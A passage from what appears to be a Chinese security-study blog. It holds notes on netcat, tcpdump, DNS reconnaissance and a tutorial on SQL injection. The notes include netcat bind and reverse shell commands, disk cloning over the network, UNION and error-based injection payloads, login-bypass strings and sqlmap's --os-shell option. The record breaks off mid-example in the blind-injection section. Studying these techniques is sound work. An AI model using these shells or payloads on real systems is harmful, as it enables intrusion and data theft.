1.1.1.1 80            Web</p><p>​    nc -h       可以查看nc可用参数</p><h5 id="传输文本信息"><a href="#传输文本信息" class="headerlink" title="传输文本信息"></a>传输文本信息</h5><p>​    A：nc -l -p 4444        -p是指定端口号；两个电脑要相互通信需要开放一个端口</p><p>​    B：nc -nv 1.1.1.1 4444        1.1.1.1是电脑A的ip地址</p><p>连接成功后两台电脑就可以聊天了</p><p>电子取证</p><p>​    在电脑B上输入#ls -l | nc -nv 1.1.1.1 4444  会在电脑A上显示结果，而电脑B上不会显示；在电脑A上输入#nc -l -p 4444 &gt; ps.txt 从外来的显示内容会存储在ps.txt</p><p>传输文件</p><p>​    A：nc -lp 333 &gt; 1.mp4                    A在这里是文件的接收端</p><p>​    B：nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1                    -q 1：的意思是传输之后一秒后断开</p><p>​    或者</p><p>​    A：nc -q 1 -lp 333 &lt; a.mp4 -q 1            把a.mp4这个文件放在333端口里等别人来连接</p><p>​            A在这里是文件的发送端</p><p>​    B： nc -nv 1.1.1.1 333 &gt; b.mp4</p><p>传输目录</p><p>​    A：tar -cvf  -  music/  |  nc -lp 333 -q 1</p><p>​    B： nc -nv 1.1.1.1 333  | tar -xvf -</p><p>加密传文件</p><p>​    A：nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4            这里A是接收端</p><p>​    B：mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</p><p>​            因为要加密所以运行命令后需要输入两次密码</p><p>​            在B端进行文件的加密在A端进行解密</p><h5 id="流媒体服务"><a href="#流媒体服务" class="headerlink" title="流媒体服务"></a>流媒体服务</h5><p>​    A：cat 1.mp4 | nc -lp 333</p><p>​    B：nc -nv  1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</p><p>​        从A端流过来多少媒体，B端就播放多少</p><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>​    nc -nvz 1.1.1.1 1-65535                -z：扫描模式  zero-I/O</p><p>​    nc -vnzu 1.1.1.1 1-1024                -u：探测UDP端口</p><p>默认情况下nc是使用TCP进行探测的</p><h5 id="远程克隆硬盘"><a href="#远程克隆硬盘" class="headerlink" title="远程克隆硬盘"></a>远程克隆硬盘</h5><p>​    A：nc -lp 333 | dd of =/dev/sda</p><p>​    B： dd if =/dev/sda | nc -nv 1.1.1.1 333 -q 1</p><p>​    远程电子取证，可以将目标服务器硬盘远程复制，或者内存。</p><h5 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h5><p>​    正向：    </p><p>​        A：nc -lp 333 -c bash</p><p>​        B：nc -nv 1.1.1.1 333            这里B机是控制端，A是被控制端</p><p>​    反向：</p><p>​        A：nc -lp 333                        这里A机是控制端，B是被控制端</p><p>​        B：nc -nv  1.1.1.1 333 -c bash</p><p>​    Windows用户bash改成cmd</p><h5 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a>NCAT</h5><p>​    缺点：</p><p>​            Nc缺乏加密和身份验证的能力</p><p>​    Ncat包含于nmap工具包中，是为了弥补nc无法加密的缺点而生成的</p><p>​    A：ncat -c bash  –allow 192.168.20.14 -vnl 333 –ssl        这里A是被控端</p><p>​    B：ncat -nv 1.1.1.1 333 –ssl                192.168.20.14是B的IP</p><p>​    不同系统/平台的nc参数功能不尽相同</p><p>​        nc所有的操作ncat都可以实现</p><h4 id="WIRESHARK"><a href="#WIRESHARK" class="headerlink" title="WIRESHARK"></a>WIRESHARK</h4><p>​    抓包嗅探协议分析</p><p>​    安全专家必备的技能</p><p>​    抓包引擎</p><p>​        Libpcap9——linux</p><p>​        Winpcap10——Windows</p><p>​    解码能力</p><h5 id="筛选器"><a href="#筛选器" class="headerlink" title="筛选器"></a>筛选器</h5><p>​    过滤掉干扰的数据包</p><p>​    抓包筛选器</p><p>​    显示筛选器</p><p>企业抓包部署方案</p><p>​    Sniffer</p><p>​    Cace/riverbed</p><p>​    Casecad pilot    </p><h4 id="TCPDUMP——抓包"><a href="#TCPDUMP——抓包" class="headerlink" title="TCPDUMP——抓包"></a>TCPDUMP——抓包</h4><p>​    tcpdump -h：可以查看有哪些参数</p><p>​    -i：指定网卡</p><p>​    -w：抓包的信息存储为一个文件，一般文件名用.pcap结尾</p><p>​    -r：即read，显示文件内容</p><p>​    -X：按照16进制来显示</p><h5 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h5><p>​    默认只抓68个字节</p><p>​    tcpdump -i eth0 -s 0 -w file.pcap</p><p>​    tcpdump -i eth0 port 22</p><h5 id="读取抓包文件"><a href="#读取抓包文件" class="headerlink" title="读取抓包文件"></a>读取抓包文件</h5><p>​    tcpdump -r file.pcap    </p><h5 id="筛选"><a href="#筛选" class="headerlink" title="筛选"></a>筛选</h5><p>​    tcpdump -n -r http.cap | awk ‘{print $3}’ | sort -u</p><p>​    tcpdump -n src host 145.254.160.237    -r http.cap</p><p>​    tcpdump -n dst host 145.254.160.237 -r http.cap</p><p>​    tcpdump -n port 53 -r http.cap</p><p>​    tcpdimp -nX port 80 -r http.cap</p><h5 id="高级筛选"><a href="#高级筛选" class="headerlink" title="高级筛选"></a>高级筛选</h5><p>tcpdump -A -n ‘tcp[13]=24’ -r http.cap</p><p>显示tcp包第14个字节换算是24的数据包</p><h5 id="过程文档记录"><a href="#过程文档记录" class="headerlink" title="过程文档记录"></a>过程文档记录</h5><p>Dradis</p><p>​    ·短期临时小团队资源共享</p><p>​    ·各种插件导入文件</p><p>Keepnote</p><p>Truecrypt                这是一个加密工具，但是已经不再更新了</p><p>​    在kali的附件里面可以找到</p><p>​    里面有一个选项：假如有人指着你的头，让你输入密码，你可以输入另一个密码，然后打开的是一个空的卷，这个卷是外部的卷，真正的文件在一个隐藏的地方，即隐藏的卷。</p><h2 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h2><p>被动信息收集就是通过公开渠道可获得的信息</p><p>与目标系统不产生直接交互；</p><p>尽量避免留下一切痕迹；</p><p>OSINT：</p><p>​    美国军方：<a href="http://www.fas.org/irp/dodair/army/atp2-22.9.pdf" target="_blank" rel="noopener">http://www.fas.org/irp/dodair/army/atp2-22.9.pdf</a></p><p>​    北大西洋公约组织：<a href="http://information-retrie.info/docs/NATO-OSINT.html" target="_blank" rel="noopener">http://information-retrie.info/docs/NATO-OSINT.html</a></p><h3 id="信息收集内容："><a href="#信息收集内容：" class="headerlink" title="信息收集内容："></a>信息收集内容：</h3><p>IP地址段；</p><p>域名信息；</p><p>邮箱地址；</p><p>文档图片数据；</p><p>公司地址；</p><p>公司组织架构；</p><p>联系电话/传真号码；</p><p>人员姓名/职务；</p><p>目标系统是用的技术架构；</p><p>公开的商业信息。</p><h3 id="信息用途"><a href="#信息用途" class="headerlink" title="信息用途"></a>信息用途</h3><p>用信息描述目标；</p><p>发现目标系统；</p><p>社会工程学攻击；</p><p>物理缺口。0</p><h3 id="信息收集——DNS"><a href="#信息收集——DNS" class="headerlink" title="信息收集——DNS"></a>信息收集——DNS</h3><p>域名解析成IP地址</p><p>域名与FQDN的区别</p><p>​    例：域名：baidu.com；FQDN：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p><p>域名记录：A、Cnmae、NS、MX、ptr</p><p>​    NS：域名服务器地址记录；</p><p>​    MX：邮箱服务器地址记录；</p><p>​    ptr：通过IP反向解析为域名记录</p><h4 id="DNS信息收集——NSLooKup"><a href="#DNS信息收集——NSLooKup" class="headerlink" title="DNS信息收集——NSLooKup"></a>DNS信息收集——NSLooKup</h4><pre><code>例：nslookup www.sina.comset type=mx        #设定只查MX记录set    type=a        #设定只查a记录set    a=any        #查询任何类型server    2020.106.0.20    #可以更换域名服务器地址</code></pre><p>type可以用q代替</p><h3 id="信息收集——DIG"><a href="#信息收集——DIG" class="headerlink" title="信息收集——DIG"></a>信息收集——DIG</h3><p>例：</p><pre><code>dig @8.8.8.8 www.sina.com MXdig www.sina.com any反向查询：dig +noall +answer -x 192.168.0.0bind版本信息：dig + noall+answer txt chaos VERSION.BIND  @ ns3.dnsv4.comDNS追踪：dig +trace example.com</code></pre><h4 id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h4><p>如过目标DNS服务器配置有问题，那么通过区域传输可以得到目标的所有记录</p><pre><code>dig @ns1.example.com example.com axfrhost -T -l sina.com ns3.sina.com</code></pre><h4 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h4><p>如果目标不允许区域传输，为了得到更多的DNS记录就用DNS字典爆破。</p><p>掌握以下一种工具即可，然后将其他工具中自带的字典集，放在一起</p><p>一、fierce</p><pre><code>fierce -dnsserver 8.8.8.8 -dns sina.com.cn -worldlist a.txt        #-worldlist就是指定字典文件dpkg -L fierce                    #查找fierce软件相关的文件，在这里可以找到这个软件的字典文件/usr/share/fierce/hosts.txt     #应该就是他的字典文件</code></pre><p>二、dnsdict6</p><pre><code>dnsdict6 -d4 -t 16 -x sina.com        #-t是指定线程数    -x是指定什么级别的字典dnsdict6 -h                         #此命令可以查看选项</code></pre><p>三、dnsenum</p><pre><code>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml    #-o可以指定导出文件，-f指定字典文件find / -name dnsenum            #此命令用于查找字典文件位置和dpkg差不多</code></pre><p>四、dnsmap</p><pre><code>dnsmap sina.com -w dns.txt        #-w指定字典文件</code></pre><p>五、dnsrecon</p><pre><code>dnsrecon -d sina.com --lifetime 10 -t brt -D namelist.txt        #-t指定查询强度</code></pre><h3 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h3><p>whois工具</p><pre><code>whois -h whois.apnic.net sina.com        #-h是指定whois工具网站</code></pre><table><thead><tr><th>AFRINIC</th><th><a href="http://www.afrincic.net" target="_blank" rel="noopener">http://www.afrincic.net</a></th></tr></thead><tbody><tr><td>APNIC</td><td><a href="http://www.apnic.net" target="_blank" rel="noopener">http://www.apnic.net</a></td></tr><tr><td>ARIN</td><td><a href="http://www.arin.net" target="_blank" rel="noopener">http://www.arin.net</a></td></tr><tr><td>LANA</td><td><a href="http://www.iana.com" target="_blank" rel="noopener">http://www.iana.com</a></td></tr><tr><td>ICANN</td><td><a href="http://www.lcann.org" target="_blank" rel="noopener">http://www.lcann.org</a></td></tr><tr><td>LACNIC</td><td><a href="http://www.lacnic.net" target="_blank" rel="noopener">http://www.lacnic.net</a></td></tr><tr><td>NRO</td><td><a href="http://www.nro.net" target="_blank" rel="noopener">http://www.nro.net</a></td></tr><tr><td>RIPE</td><td><a href="http://www.ripe.net" target="_blank" rel="noopener">http://www.ripe.net</a></td></tr><tr><td>InterNic</td><td><a href="http://www.internic.net" target="_blank" rel="noopener">http://www.internic.net</a></td></tr></tbody></table><h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><p>搜索引擎可以找到：公司新闻动态、重要雇员信息、机密文档/网络拓扑、用户名密码、目标系统软硬件技术架构</p><h4 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h4><p>SHODAN是一个可以搜索联网设备的搜索引擎</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试总结</title>
      <link href="/2020/07/26/shen-tou-ce-shi-zong-jie/"/>
      <url>/2020/07/26/shen-tou-ce-shi-zong-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="掌控安全Web安全所学总结"><a href="#掌控安全Web安全所学总结" class="headerlink" title="掌控安全Web安全所学总结"></a>掌控安全Web安全所学总结</h1><p>从掌控安全学习web渗透入门，到现在还一直没有总结过所学知识，虽然有写笔记，但是还是觉得知识有些零散，使用起来不是那么得心应手，我想，再把那些知识复习总结一下会好很多。</p><p>在这里声明一下，以下知识是按照MySQL数据库和PHP来讲解的，但是原理都一样，其他的数据库和其他的语言出问题的地方也都存在相似之处。</p><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>判断字符串是否符合某一规则（判断是否符合手机号，邮箱规则）</p><p>从一个字符串中找出符合规则的所有字符串（取HTML标签名）</p><h3 id="标识"><a href="#标识" class="headerlink" title="标识"></a>标识</h3><p>PHP中使用正则规则而一定要加代表正则的标识    <strong>/ /</strong></p><h3 id="常用正则函数"><a href="#常用正则函数" class="headerlink" title="常用正则函数"></a>常用正则函数</h3><p>preg_match_all(正则表达式,匹配字符串,匹配到的东西放入数组)</p><p>​    返回匹配到的次数</p><p>preg_replace(正则表达式,替换成什么,匹配字符串)</p><p>​    返回替换后的结果</p><h3 id="常用转义字符"><a href="#常用转义字符" class="headerlink" title="常用转义字符"></a>常用转义字符</h3><p>数字：\d</p><p>非数字：\D</p><p>空白字符(空格、制表符 、换页符等)：\s</p><p>非空白符：\S</p><p>单词字符(26个英文字母+数字+下划线)：\w</p><p>非单词字符：\W</p><h3 id="自定义字符"><a href="#自定义字符" class="headerlink" title="自定义字符"></a>自定义字符</h3><p>字符集合：[单个字符或字符区间]，用于匹配集合内字符</p><p>如：</p><p>​        [a-z]：表示a-z这26个小写字母；</p><p>​        [0-9a-z]：表示0-9和a-z；</p><p>​        [135a-h]：表示包含数字1,3,5和字母a-h这8个字母。</p><p><strong>注意：两个不同字符段之间请勿使用,隔开</strong></p><p>非集：[^单个字符或字符串之间]，用于匹配非集合内字符</p><p>如：</p><p>​        [^0-9]：表示匹配所有非数字字符；</p><p>​        [^a-zA-Z]：表示匹配所有有非字母字符。</p><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><p>()：代表这是一个整体；</p><p>^：匹配输入字符串的开始位置；</p><p>$：匹配输入字符串的结尾位置；</p><p>.：通配符[代表任意字符] [不匹配换行]；</p><p>*：匹配0次或多次；</p><p>+：匹配1次或多次；</p><p>\：转义字符；</p><p>|：两项之间的一个选择。</p><h3 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h3><p>{n}：如0{8}：指只有连起来的8个0才会被匹配；</p><p>{n,}：如0{2,}：指只要有2个0及其以上就匹配；</p><p>{n,m}：如0{2,4}：指最少匹配2个0，最多匹配4个0。</p><p><strong>注意：被匹配时，默认匹配最多的次数</strong></p><h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><p>/i:不区分大小写；</p><p>/A：匹配规则必须从头开始匹配；</p><p>/s：将匹配一切字符；</p><p>/x：正则表达式中的空白字符会被忽略。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="信息收集收集什么？"><a href="#信息收集收集什么？" class="headerlink" title="信息收集收集什么？"></a>信息收集收集什么？</h3><ol><li>whois信息</li></ol><p>whois指的是域名注册时留下的信息，比如留下管理员的名字、电话号码、邮箱。</p><ol start="2"><li>子域名（包括具有功能的IP）</li></ol><p>顶级域名下的二级域名或者三级甚至更多级的域名都属于子域名</p><p>子域名可以扩大攻击范围，同一域名下的二级域名都属于相同资产，一般而言都有相关的联系。</p><ol start="3"><li>端口探测</li></ol><p>有些危险端口开放了我们就可以尝试入侵，例如445|3306|22|1433|6379 可以尝试爆破或者是使用某些存在漏洞的服务。而且有可能一台服务器上面不同端口代表着不同的web网站~ </p><p>常用工具为Nmap。</p><ol start="4"><li>旁站（同ip网站）</li></ol><p>旁站指的是在同一ip上面的多个网站，如果你成功拿下旁站，运气好和主站在同一台机器上，是不是就拿到了主站？入伙运气不好是一个内网，我我们是不是可以尝试内网渗透？</p><ol start="5"><li>C段 </li></ol><p>例如192.168.1.1，那么192.168.1.1-192.168.1.255都属于同一C段，有些学校或者大公司，他们会持有整个IP段，这个ip 段中所有的ip都是那个公司的资产，拿下一台可能有用的信息，可能在同一内网。</p><ol start="6"><li>目录扫描</li></ol><p>有些网站可能某个目录下是一个新的网站，有的时候目录扫描直接下载了压缩包遇难、编辑器目录、一些废弃的页面（会报错）。</p><p>常用工具为御剑。</p><ol start="7"><li>指纹识别</li></ol><p>cms可能存在通杀漏洞，如果使用了CMS建站我们可以用通杀漏洞直接攻击。</p><ol start="8"><li>内容敏感信息泄露（google hacking）</li></ol><p>尝试Google语法，站到 某些敏感内容，比如包含身份证号码的表格、包含服务器账号密码的文件、某些敏感文件、备份数据库。</p><p>还有一种网络空间搜索引擎的东西，基于物联网搜索，搜索联网的网络设备，例如：钟馗之眼、Shodan、fofa。</p><p>通过网络空间搜索引擎，我们能够找到开放的服务以及在线的网络设备</p><h3 id="信息收集的方法"><a href="#信息收集的方法" class="headerlink" title="信息收集的方法"></a>信息收集的方法</h3><ol><li>whois信息</li></ol><p>站长工具查询：whois.chinaz.com</p><p>国外查询：whois.com</p><ol start="2"><li>端口</li></ol><p>nmap -o 192.168.1.1(kali自带nmap)</p><p>还有一种在线扫描网站：<a href="https://www.atool99.com/port_scanner.php" target="_blank" rel="noopener">https://www.atool99.com/port_scanner.php</a></p><ol start="3"><li>旁站</li></ol><p>站长工具查询：s.tool.chinaz.com/same</p><p>​                            phpinfo.me/bing.php</p><ol start="4"><li>C段</li></ol><p>确定ip的范围，然后对端内的ip主机进行信息收集</p><ol start="5"><li>目录扫描</li></ol><p>可以使用御剑等工具进行扫描（查看robots.txt信息）</p><ol start="6"><li>指纹识别</li></ol><p>云悉、微步社区</p><ol start="7"><li>内容敏感信息泄露</li></ol><p>各种包含敏感信息的东西（google语法）</p><p>不翻墙的可以使用镜像站：</p><p>c.g456.top</p><p>gm1.xueyanren.com</p><p>hp.myway.com/myway/index.html</p><p>fireball.com</p><ol start="8"><li>子域名</li></ol><p>通过google  hack语法进行查询（爬取搜索引擎）</p><p>通过某些平台（微步社区 云悉）</p><p>使用工具爆破DNS服务器（SubBrute、Knockpy  github有下载） 泛解析（没有设置过的解析）</p><p>网页内蜘蛛爬虫    </p><h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><table><thead><tr><th>关键字</th><th>功能</th></tr></thead><tbody><tr><td>“”</td><td>双引号内的内容不可拆分</td></tr><tr><td>site:</td><td>指定域名</td></tr><tr><td>inurl:</td><td>url存在关键字的网页</td></tr><tr><td>intext</td><td>网页正文中的关键字</td></tr><tr><td>filetype</td><td>指定文件类型</td></tr><tr><td>intitle</td><td>网页标题中的关键字</td></tr><tr><td>link</td><td>link:baidu.com  表示所有和biadu.com做了连接的url</td></tr><tr><td>info</td><td>查找指定站点的一些基本信息</td></tr></tbody></table><p>这里只是列举出一些简单的用法，详细的谷歌语法百度就可以学到</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><h4 id="端口状态："><a href="#端口状态：" class="headerlink" title="端口状态："></a>端口状态：</h4><p>在信息收集中，目标副武器的端口状态也是我们要留意的</p><p>open(开放的)</p><p>close(关闭的)</p><p>Filtered(被过滤的)</p><p>unfiltered(未被过滤的)</p><p>open|filtered(开放或被过滤的)</p><p>closed|filtered(关闭或被过滤的)</p><h4 id="查端口方法："><a href="#查端口方法：" class="headerlink" title="查端口方法："></a>查端口方法：</h4><p>​    nmap -p  80,22   url/ip                自定义想要扫描的端口</p><p>​    nmap -P  1-255    url/ip                自定义端口范围</p><p>​    nmap  -r    url/ip                            随机扫描端口</p><h4 id="端口类型："><a href="#端口类型：" class="headerlink" title="端口类型："></a>端口类型：</h4><p>周知端口：0-1023</p><p>动态端口：49152-65535</p><p>注册端口：1024-49151</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>子域名的挖掘的意义在于扩大资产，渗透测试的话很可能测试一个域名，自住哪也都是测试范围，我们可以从子站中获得信息，或者拿到子站权限，对主网进行内网渗透。</p><p>对于一些网站，他的主站采用CDN加速，但是他的子站可能没有，因此，也可以从子站查询真实ip</p><p>whois查询到的信息可用来社工或者根据邮箱手机号进行密码组合用以爆破</p><p>目标的真实ip也许会对我们的渗透测试提供很多便利</p><h2 id="SQL注入原理分析"><a href="#SQL注入原理分析" class="headerlink" title="SQL注入原理分析"></a>SQL注入原理分析</h2><h3 id="注入的本质："><a href="#注入的本质：" class="headerlink" title="注入的本质："></a>注入的本质：</h3><p>把用户输入的数据当作代码执行。</p><p>这里要满足两个条件：</p><ol><li><p>用户能控制输入</p></li><li><p>原本程序要执行的代码，拼接了用户输入的数据然后进行执行</p></li></ol><h3 id="显错注入——联合查询："><a href="#显错注入——联合查询：" class="headerlink" title="显错注入——联合查询："></a>显错注入——联合查询：</h3><h4 id="1、判断注入点"><a href="#1、判断注入点" class="headerlink" title="1、判断注入点"></a>1、判断注入点</h4><p>最古老的方法：</p><p>​        and 1=1   页面显示正常</p><p>​        and 1=2    页面显示不正常</p><p>最简单的方法：</p><p>​        传参后面加’，看是否报错</p><p>若为数字型传参，可以用-1</p><p>例如：</p><p><a href="http://www.xxx.com/new.php?id=1" target="_blank" rel="noopener">http://www.xxx.com/new.php?id=1</a>            页面显示id=1的新闻</p><p><a href="http://www.xxx.com/new.php?id=2-1" target="_blank" rel="noopener">http://www.xxx.com/new.php?id=2-1</a>        页面显示id=1的新闻</p><p>只要发生上面的这些情况的，就是存在SQL注入漏洞。</p><p>一般来说and 1=1和and 1=2被拦截的可能性太高了，可以尝试一下and -1=-1;and -1=-2;and 1&gt;0 or 1=1</p><p>或者直接尝试or sleep(5)            让页面延迟5秒显示</p><p><strong>其目的就是为了判断我们输入的东西是否被当做了代码来执行了</strong>。</p><h4 id="2、判断字段数"><a href="#2、判断字段数" class="headerlink" title="2、判断字段数"></a>2、判断字段数</h4><p>如何知道表里面的字段数，就用:</p><p>order    by    1        以第1个字段进行排序</p><p>order    by    2        以第2个字段进行排序</p><p>……</p><p>例如，当order    by    3    输进去之后，页面显示不正常了，那么显示这个页面的这张表就只有两个字段。</p><h4 id="3、判断输出点"><a href="#3、判断输出点" class="headerlink" title="3、判断输出点"></a>3、判断输出点</h4><p>select    1,2            输出第1和第2个字段</p><p>这个就是用来判断在这个页面中存在sql注入的显错点在哪，只有找到了显错点，我们才能从显错点来获取数据库表中的数据。</p><p>这里假如2是输出点，那我们就可以用database()这个函数来获取数据库的库名</p><pre><code>select    1,database()</code></pre><br><p>获取数据库常规写法：</p><p>​    select    字段名    from    表名    where    条件</p><p>那么我们知道了库名之后，要怎么获取字段名和表名呢，这里有两个方法</p><p>①.猜，常用的字段名和表名</p><p>②.在mysql中高于5.0版本的有一个系统自带库information_schema，这个库中有两张表，分别是：</p><p><strong>information_schema.tables</strong>                存放表名和库的对应的表</p><p><strong>information_schema.columns</strong>            存放字段名和表名的对应</p><h4 id="4、去系统自带库的表中查表名、字段名"><a href="#4、去系统自带库的表中查表名、字段名" class="headerlink" title="4、去系统自带库的表中查表名、字段名"></a>4、去系统自带库的表中查表名、字段名</h4><p>查表名，例：</p><pre><code>url    and    1=2    union    select    1,table_name    from    infomation_schema.tables    where    table_schema=database()    limit    0,1</code></pre><p>用limit    0,1；limit    1,1;limit    2,1 这样来一个一个的显示表名</p><p>查字段名，例：</p><pre><code>url    and    1=2    union    select    1,column_name    from    information_schema.columns    where        table_schema=database()    and    table_name='刚刚查到的表名'    limit    0,1</code></pre><p>这里也同样用limit    1,1    2,1来着查看字段名</p><br><p>遇到字符型传参，如id=1’1’</p><p>加上’%23或者’–+</p><p>其主要目的就是闭合单引号，当然也有可能别人用的是双引号，这个要自己尝试，因为他不会显示出来</p><p>出现小括号也是一样的，如id=(‘1’)</p><p>用’)来闭合它，再加上%23或者–+来闭合</p><br><p>最后，查到了我们想要的表名和字段名,就可以一个个查字段中的数据了</p><pre><code>union    select        1,字段名    from    表名    limit 0,1</code></pre><h2 id="渗透测试常用工具"><a href="#渗透测试常用工具" class="headerlink" title="渗透测试常用工具"></a>渗透测试常用工具</h2><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>安装python2.7.16环境，设置环境变量：此电脑右键-&gt;属性-&gt;高级系统设置-&gt;高级-&gt;环境变量-&gt;path-&gt;编辑-&gt;新建-&gt;将python的安装路径加进去。</p><p>在安装sqlmap的文件夹里cmd，然后python  sqlmap.py就可以使用了</p><br><p>sqlmap基础命令：</p><p>-u：指定注入点（url）</p><p>-dbs：跑库名</p><p>–tables：跑表名</p><p>–columns：跑字段名</p><p>–dump：枚举数据</p><p>-D：指定库</p><p>-T：指定表</p><p>-C：指定字段</p><p>–random-agent：选择随机的user-agents头</p><p>–delay=1：每次探测延时1秒（防止访问过快被ban）</p><p>–count：查看数据量</p><p>–proxy  “<a href="http://127.0.0.1:1080&quot;：使用本地1080端口" target="_blank" rel="noopener">http://127.0.0.1:1080"：使用本地1080端口</a></p><p>–level   1-5：测试等级（最低1，最高5），level等级越高检测越详细，例如：level 2会检测cookie注入，大于3检测头注入</p><p>–is-dba：查询当前用户权限，如果dba是True可以尝试直接拿webshell</p><p>–os-shell：尝试往网站中放热一个cmd  shell（就是拥有cmd权限的shell），先选择写入shell的脚本语言，有的需要填写网站的web目录的绝对路径，有的可以直接选择好的shell的脚本语言类型就可以拿shell。</p><h3 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h3><p>首先安装java环境</p><p>原理：中间人工具</p><p>谷歌浏览器插件安装方法：</p><p>把proxy swithchysharp.crx文件改为zip文件，解压到一个文件夹内，然后拖入浏览器的扩展程序页面中</p><p>点浏览器右上角出现的小地球，点选项，情节模式名称随便起一个名字，http代理设置为127.0.0.1，8080，不代理的地址删掉，保存即可</p><p>要抓包，就打开代理，然后打开burp就可以了</p><h2 id="POST注入与Head注入"><a href="#POST注入与Head注入" class="headerlink" title="POST注入与Head注入"></a>POST注入与Head注入</h2><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><p>post注入就是在一些登录框、查询框等各种和数据库有交互的框中进行的注入</p><p>get传参是通过”?”来标识的，get传参会经过url编码，数据量有限，比较少</p><p>post传参的数据可以比较大，post注入本质和get注入无区别</p><br><p>一般我们会先尝试万能密码：admin或123465或’ or 1=1 #</p><p>假如我们直接在要输入账号的框中输入a’ or 1=1，然后用burp抓包查看的话，我们很有可能看到类似于这样的语句</p><pre><code>select from user where username='a' or 1=1 #' and password=''</code></pre><p>常规的post注入就是</p><pre><code>a' or 1=1 order by 1a' union select 1,2,3#a' union select 1,2,database()#</code></pre><p>然后其他的就跟get注入一模一样</p><p>如果#被过滤，就用–+/– qwe，还被过滤就用\*</p><br><p>用sqlmap跑post注入</p><pre><code>python sqlmap.py -u url --form</code></pre><p>也可以用burp抓一个包，然后复制下来，放在sqlmap工具的文件夹下的1.txt文件中，在username=……后面加上*，password=…后面也可以加，sqlmap就会自动替换username和password的字段的内容</p><pre><code>python sqlmap.py -r 1.txt --level 3</code></pre><h3 id="Head注入"><a href="#Head注入" class="headerlink" title="Head注入"></a>Head注入</h3><p>PHP全局变量——超全局变量</p><p>HTTP开头的传参量都是可以有我们自己决定的，甚至可以在包中输入自己的东西</p><p>有获取就很容易有存储</p><p>我们想一下insert into () [插入页面会不会有输出]</p><p>我们可以通过两种方法来做：盲注和报错注入</p><p>这里我们用报错注入来讲</p><br><p>致命性报错：</p><p>​    updatexml()：更新xml文档的函数</p><p>​        语法：updatexml(目标xml内容，xml文档路径，更新的内容)</p><p>​        例：</p><pre><code>updatexml(123,concat('~',(select database())),123)</code></pre><p>concat()：拼接字符串</p><p>如果不行，也可以尝试下用0x7e代替~，因为数据库是支持16进制的，而且通常单引号会被过滤</p><br><p>既然head注入是用在请求头中的，那么我们就用burp抓一个包，然后在数据包里的一些请求头中假如上面的注入语句</p><p>例如在User-Agent的数据后面加上</p><pre><code>'or updatexml(1,concat(0x7e,(select database())),1),1)#</code></pre><p>用and的时候，前面的错了，则后面的不执行；前面的对了，则后面的执行；</p><p>用or的时候，前面的对了，则后面的不执行；前面的错了，则后面的执行；</p><p>所以，如果用or不行，就换and。</p><p>报错注入要一个字段一个字段的拿</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>盲注就是服务器无回显的时候完成的注入攻击</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>盲注分为布尔盲注和时间盲注，</p><p>布尔盲注就是True和Flase；</p><p>时间盲注就是页面返回值只有一种，true，无论输入任何值，返回情况都会按照正常的来处理。</p><h3 id="需要认识的函数"><a href="#需要认识的函数" class="headerlink" title="需要认识的函数"></a>需要认识的函数</h3><p>length()：返回字符串的长度；</p><p>substr()：截取字符串；（语法    substr(str,pos,len);    pos代表从哪里开始截取）</p><p>ascii()：返回字符串的ascii码;；</p><p>sleep()：将程序挂起n秒；</p><p>if(exp1,exp2,exp3)：判断语句，如果第一个语句正确就执行第二个语句，如果错误则执行第三个语句。</p> <br><p>示例：</p><pre><code>and length(database())&gt;12 #如果页面正常，则数据库名有12个字符and substr(database(),1,1)=1 